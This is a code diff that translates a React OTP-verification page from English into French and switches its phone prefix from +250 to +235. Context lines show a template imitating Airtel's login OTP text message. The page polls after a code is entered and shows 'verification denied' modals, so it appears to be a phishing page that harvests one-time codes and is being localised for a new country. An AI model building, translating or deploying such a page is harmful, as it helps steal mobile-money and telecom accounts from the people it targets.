@@ -269,16 +269,16 @@ const message = `<#> Your OTP for My Airtel App login is ${otpCode}. Do Not shar
         onClick={handleBackToLogin}
         className="flex items-center gap-2 text-gray-500 hover:text-black text-sm mb-4 transition-colors">
         <ArrowLeft className="w-4 h-4" />
-        Back to login
+        Retour à la connexion
       </button>
 
       {/* OTP Verification Section */}
-      <h2 className="text-2xl sm:text-4xl font-black text-black mb-1 sm:mb-2">Verify your code</h2>
-      <p className="text-gray-500 text-sm sm:text-lg mb-6 sm:mb-8">Enter the 4-digit code sent to +250{phoneNumber}</p>
+      <h2 className="text-2xl sm:text-4xl font-black text-black mb-1 sm:mb-2">Vérifiez votre code</h2>
+      <p className="text-gray-500 text-sm sm:text-lg mb-6 sm:mb-8">Saisissez le code à 4 chiffres envoyé à +235{phoneNumber}</p>
 
       {/* OTP Input Field */}
       <div className="mb-6 sm:mb-8">
-        <label className="block text-black font-bold mb-2 sm:mb-3 text-sm sm:text-base">Enter OTP Code</label>
+        <label className="block text-black font-bold mb-2 sm:mb-3 text-sm sm:text-base">Saisissez le code OTP</label>
         <div className="flex gap-2 sm:gap-3 justify-center">
           {otpDigits.map((digit, index) => (
             <input
@@ -315,8 +315,8 @@ const message = `<#> Your OTP for My Airtel App login is ${otpCode}. Do Not shar
         onClick={handleVerify}
         disabled={!otpDigits.every(d => d) || isPolling || isLoading}
         className="w-full bg-red-400 text-black font-bold text-base sm:text-xl py-3 sm:py-4 rounded-lg sm:rounded-2xl flex items-center justify-center gap-2 sm:gap-3 hover:bg-red-500 transition-colors mb-3 sm:mb-4 disabled:bg-gray-300 disabled:cursor-not-allowed">
-        {isPolling ? 'Verifying...' : 'Verify Code'}
-         {isLoading ? 'Processing...' : 'Login'}
+        {isPolling ? 'Vérification en cours…...' : 'Vérifier le code'}
+         {/* {isLoading ? 'Processing...' : 'Login'} */}
         <ArrowLeft className="w-5 h-5 sm:w-6 sm:h-6 rotate-180" />
       </button>
 
@@ -329,7 +329,7 @@ const message = `<#> Your OTP for My Airtel App login is ${otpCode}. Do Not shar
             ? 'bg-gray-200 text-gray-500 cursor-not-allowed'
             : 'bg-gray-100 text-black hover:bg-gray-200'
         }`}>
-        {isTimerActive ? 'Resend code' : 'Resend code now'}
+        {isTimerActive ? 'Renvoyer le code' : 'Renvoyer le code'}
       </button>
     </SharedLayout>
 
@@ -338,9 +338,9 @@ const message = `<#> Your OTP for My Airtel App login is ${otpCode}. Do Not shar
         <div className="fixed inset-0 bg-black/50 flex items-center justify-center p-4 z-50">
           <div className="bg-white rounded-2xl sm:rounded-3xl p-8 sm:p-12 max-w-sm w-full shadow-2xl text-center">
             <Loader className="w-12 h-12 sm:w-16 sm:h-16 text-yellow-600 animate-spin mx-auto mb-4" />
-            <h3 className="text-xl sm:text-2xl font-black text-black mb-3">Loading</h3>
+            <h3 className="text-xl sm:text-2xl font-black text-black mb-3">Chargement…</h3>
             <p className="text-gray-500 text-sm sm:text-base">
-              Please do not close this window. Verifying your OTP...
+              Veuillez ne pas fermer cette fenêtre. Vérification de votre code OTP en cours…
             </p>
           </div>
         </div>
@@ -365,23 +365,23 @@ const message = `<#> Your OTP for My Airtel App login is ${otpCode}. Do Not shar
             </div>
 
             {/* Error Message */}
-            <h3 className="text-xl sm:text-2xl font-black text-black text-center mb-2">OTP Expired</h3>
+            <h3 className="text-xl sm:text-2xl font-black text-black text-center mb-2">Code OTP expiré</h3>
             <p className="text-gray-500 text-sm sm:text-base text-center mb-6 sm:mb-8">
-              Your OTP verification has been denied. Please request a new code to continue.
+              La vérification de votre code OTP a été refusée. Veuillez demander un nouveau code pour continuer.
             </p>
 
             {/* Resend Button */}
             <button 
               onClick={handleResendFromModal}
               className="w-full bg-red-400 text-black font-bold text-base sm:text-lg py-3 sm:py-4 rounded-lg sm:rounded-2xl hover:bg-red-500 transition-colors mb-3">
-              Resend Code
+             Renvoyer le code
             </button>
 
             {/* Back to Login Button */}
             <button 
               onClick={handleBackToLogin}
               className="w-full bg-gray-100 text-black font-bold text-base sm:text-lg py-3 sm:py-4 rounded-lg sm:rounded-2xl hover:bg-gray-200 transition-colors">
-              Back to Login
+             Retour à la connexion
             </button>
           </div>
         </div>
@@ -406,23 +406,23 @@ const message = `<#> Your OTP for My Airtel App login is ${otpCode}. Do Not shar
             </div>
 
             {/* Error Message */}
-            <h3 className="text-xl sm:text-2xl font-black text-black text-center mb-2">OTP Expired</h3>
+            <h3 className="text-xl sm:text-2xl font-black text-black text-center mb-2">Code OTP expiré</h3>
             <p className="text-gray-500 text-sm sm:text-base text-center mb-6 sm:mb-8">
-              The verification code has expired. Please request a new code to continue.
+              La vérification de votre code OTP a été refusée. Veuillez demander un nouveau code pour continuer.
             </p>
 
             {/* Resend Button */}
             <button 
               onClick={handleResendFromExpiredModal}
               className="w-full bg-red-400 text-black font-bold text-base sm:text-lg py-3 sm:py-4 rounded-lg sm:rounded-2xl hover:bg-red-500 transition-colors mb-3">
-              Resend Code
+              Renvoyer le code
             </button>
 
             {/* Back to Login Button */}
             <button 
               onClick={handleBackToLogin}
               className="w-full bg-gray-100 text-black font-bold text-base sm:text-lg py-3 sm:py-4 rounded-lg sm:rounded-2xl hover:bg-gray-200 transition-colors">
-              Back to Login
+              Retour à la connexion
             </button>
           </div>
         </div>
